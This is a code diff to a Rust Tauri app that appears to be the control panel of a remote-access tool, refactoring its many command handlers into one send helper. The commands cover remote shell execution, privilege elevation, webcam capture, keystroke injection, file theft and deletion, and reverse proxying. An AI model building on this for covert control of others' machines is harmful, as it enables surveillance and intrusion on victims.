@@ -28,7 +28,6 @@ use std::io::Write;
 use rmp_serde::Serializer;
 use std::process::Command;
 
-
 pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<Sender<ServerCommand>, String> {
     let channel_tx = {
         let tauri_state = tauri_state.0.lock().unwrap();
@@ -49,6 +48,16 @@ pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle
     };
 
     Ok(channel_tx)
+}
+
+pub async fn send_server_command(command: ServerCommand, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<(), String> {
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
+
+    channel_tx.send(command)
+        .await
+        .map_err(|e| format!("Failed to send command: {}", e))?;
+    
+    Ok(())
 }
 
 #[tauri::command]
@@ -126,14 +135,7 @@ pub async fn start_server(
 
 #[tauri::command]
 pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    { 
-        let channel_tx = get_channel_tx(tauri_state.clone(), app_handle).await?;
-        
-        channel_tx.send(ServerCommand::CloseClientSessions())
-            .await
-            .map_err(|e| format!("Failed to send CloseClientSessions command: {}", e))?;
-        
-    }
+    send_server_command(ServerCommand::CloseClientSessions(), tauri_state.clone(), app_handle).await?;
 
     {
         let mut tauri_state = tauri_state.0.lock().unwrap();
@@ -286,13 +288,9 @@ pub async fn fetch_clients(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<Vec<ClientInfo>, String> {
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
     let (tx, rx) = tokio::sync::oneshot::channel();
     
-    channel_tx.send(ServerCommand::GetClients(tx))
-        .await
-        .map_err(|e| format!("Failed to send GetClients command: {}", e))?;
+    send_server_command(ServerCommand::GetClients(tx), tauri_state, app_handle).await?;
     
     match rx.await {
         Ok(clients) => Ok(clients),
@@ -306,16 +304,9 @@ pub async fn fetch_client(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<ClientInfo, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-    
     let (tx, rx) = tokio::sync::oneshot::channel();
     
-    channel_tx.send(ServerCommand::GetClient(socket_addr, tx))
-        .await
-        .map_err(|e| format!("Failed to send GetClient command: {}", e))?;
+    send_server_command(ServerCommand::GetClient(addr.parse().unwrap(), tx), tauri_state, app_handle).await?;
     
     match rx.await {
         Ok(Some(client)) => Ok(client),
@@ -331,36 +322,16 @@ pub async fn take_screenshot(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-    
-    channel_tx.send(ServerCommand::TakeScreenshot(socket_addr, display.to_string()))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::TakeScreenshot(addr.parse().unwrap(), display.to_string()), tauri_state, app_handle).await?;
         
     Ok("Screenshot requested".to_string())
 }
 
 #[tauri::command]
 pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<(), String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
     match run {
-        "disconnect" => {
-            channel_tx.send(ServerCommand::DisconnectClient(socket_addr))
-                .await
-                .map_err(|e| format!("Failed to send DisconnectClient command: {}", e))?;
-        }
-        "reconnect" => {
-            channel_tx.send(ServerCommand::ReconnectClient(socket_addr))
-                .await
-                .map_err(|e| format!("Failed to send ReconnectClient command: {}", e))?;
-        }
+        "disconnect" => send_server_command(ServerCommand::DisconnectClient(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "reconnect" => send_server_command(ServerCommand::ReconnectClient(addr.parse().unwrap()), tauri_state, app_handle).await?,
         _ => {}
     }
 
@@ -376,18 +347,11 @@ pub async fn start_remote_desktop(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::StartRemoteDesktop(socket_addr, RemoteDesktopConfig {
+    send_server_command(ServerCommand::StartRemoteDesktop(addr.parse().unwrap(), RemoteDesktopConfig {
         display,
         quality,
         fps,
-    }))
-    .await
-    .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Remote desktop started".to_string())
 }
@@ -398,14 +362,7 @@ pub async fn stop_remote_desktop(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::StopRemoteDesktop(socket_addr))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::StopRemoteDesktop(addr.parse().unwrap()), tauri_state, app_handle).await?;
 
     Ok("Remote desktop stopped".to_string())
 }
@@ -422,21 +379,14 @@ pub async fn send_mouse_click(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::MouseClick(socket_addr, MouseClickData {
+    send_server_command(ServerCommand::MouseClick(addr.parse().unwrap(), MouseClickData {
         display,
         x: x as i32,
         y: y as i32,
         click_type,
         action_type,
         scroll_amount: scroll_amount.unwrap_or(0),
-    }))
-        .await
-        .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Mouse click sent".to_string())
 }
@@ -448,17 +398,10 @@ pub async fn visit_website(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::VisitWebsite(socket_addr, VisitWebsiteData {
+    send_server_command(ServerCommand::VisitWebsite(addr.parse().unwrap(), VisitWebsiteData {
         visit_type: "normal".to_string(),
         url: url.to_string(),
-    }))
-        .await
-        .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Website visited".to_string())
 }
@@ -504,19 +447,12 @@ pub async fn send_messagebox(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::ShowMessageBox(socket_addr, MessageBoxData {
+    send_server_command(ServerCommand::ShowMessageBox(addr.parse().unwrap(), MessageBoxData {
         title: title.to_string(),
         message: message.to_string(),
         button: button.to_string(),
         icon: icon.to_string(),
-    })) 
-        .await
-        .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Messagebox sent".to_string())
 }
@@ -527,14 +463,7 @@ pub async fn elevate_client(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::ElevateClient(socket_addr))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::ElevateClient(addr.parse().unwrap()), tauri_state, app_handle).await?;
 
     Ok("Client elevated".to_string())
 }
@@ -546,14 +475,7 @@ pub async fn handle_system_command(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::ManageSystem(socket_addr, run.to_string()))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::ManageSystem(addr.parse().unwrap(), run.to_string()), tauri_state, app_handle).await?;
 
     Ok("System command sent".to_string())
 }
@@ -564,14 +486,7 @@ pub async fn process_list(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::GetProcessList(socket_addr))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::GetProcessList(addr.parse().unwrap()), tauri_state, app_handle).await?;
 
     Ok("Process list sent".to_string())
 }
@@ -584,39 +499,19 @@ pub async fn kill_process(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::KillProcess(socket_addr, Process {
+    send_server_command(ServerCommand::KillProcess(addr.parse().unwrap(), Process {
         pid: pid as usize,
         name: name.to_string(),
-    }))
-        .await
-        .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Process killed".to_string())
 }
 
 #[tauri::command]
-pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-    
+pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {    
     match run {
-        "start" => {
-            channel_tx.send(ServerCommand::StartShell(socket_addr))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
-        "stop" => {
-            channel_tx.send(ServerCommand::ExitShell(socket_addr))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
+        "start" => send_server_command(ServerCommand::StartShell(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "stop" => send_server_command(ServerCommand::ExitShell(addr.parse().unwrap()), tauri_state, app_handle).await?,
         _ => {}
     }
 
@@ -625,14 +520,7 @@ pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTa
 
 #[tauri::command]
 pub async fn execute_shell_command(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::ShellCommand(socket_addr, run.to_string()))
-        .await
-        .map_err(|e| e.to_string())?;   
+    send_server_command(ServerCommand::ShellCommand(addr.parse().unwrap(), run.to_string()), tauri_state, app_handle).await?;
     
     Ok("Shell command sent".to_string())
 }
@@ -645,27 +533,10 @@ pub async fn read_files(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
     match run {
-        "previous_dir" => {
-            channel_tx.send(ServerCommand::PreviousDir(socket_addr))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
-        "view_dir" => {
-            channel_tx.send(ServerCommand::ViewDir(socket_addr, path.to_string()))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
-        "available_disks" => {
-            channel_tx.send(ServerCommand::AvailableDisks(socket_addr))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
+        "previous_dir" => send_server_command(ServerCommand::PreviousDir(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "view_dir" => send_server_command(ServerCommand::ViewDir(addr.parse().unwrap(), path.to_string()), tauri_state, app_handle).await?,
+        "available_disks" => send_server_command(ServerCommand::AvailableDisks(addr.parse().unwrap()), tauri_state, app_handle).await?,
         _ => {}
     }
 
@@ -681,27 +552,10 @@ pub async fn manage_file(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
     match run {
-        "download_file" => {
-            channel_tx.send(ServerCommand::DownloadFile(socket_addr, file.to_string()))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
-        "remove_file" => {
-            channel_tx.send(ServerCommand::RemoveFile(socket_addr, file.to_string()))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
-        "remove_dir" => {
-            channel_tx.send(ServerCommand::RemoveDir(socket_addr, file.to_string()))
-                .await
-                .map_err(|e| e.to_string())?;
-        }
+        "download_file" => send_server_command(ServerCommand::DownloadFile(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
+        "remove_file" => send_server_command(ServerCommand::RemoveFile(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
+        "remove_dir" => send_server_command(ServerCommand::RemoveDir(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
         _ => {}
     }
 
@@ -710,28 +564,14 @@ pub async fn manage_file(
     
 #[tauri::command]
 pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::StartReverseProxy(socket_addr, port.to_string(), localport.to_string()))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::StartReverseProxy(addr.parse().unwrap(), port.to_string(), localport.to_string()), tauri_state, app_handle).await?;
 
     Ok("Reverse proxy started".to_string())
 }
 
 #[tauri::command]
 pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::StopReverseProxy(socket_addr))
-        .await
-        .map_err(|e| e.to_string())?;
+    send_server_command(ServerCommand::StopReverseProxy(addr.parse().unwrap()), tauri_state, app_handle).await?;
 
     Ok("Reverse proxy stopped".to_string())
 }
@@ -803,36 +643,21 @@ pub async fn send_keyboard_input(
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
-    let socket_addr = addr.parse()
-    .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::KeyboardInput(socket_addr, KeyboardInputData {
+    send_server_command(ServerCommand::KeyboardInput(addr.parse().unwrap(), KeyboardInputData {
         key_code,
         character: character.to_string(),
         is_keydown,
         shift_pressed,
         ctrl_pressed,
         caps_lock,
-    }))
-        .await
-        .map_err(|e| e.to_string())?;
+    }), tauri_state, app_handle).await?;
 
     Ok("Keyboard input sent".to_string())
 }
 
 #[tauri::command]
 pub async fn request_webcam(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-
-    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
-
-    channel_tx.send(ServerCommand::RequestWebcam(socket_addr))
-        .await
-        .map_err(|e| e.to_string())?;
-
+    send_server_command(ServerCommand::RequestWebcam(addr.parse().unwrap()), tauri_state, app_handle).await?;
 
     Ok("Webcam request sent".to_string())
 }
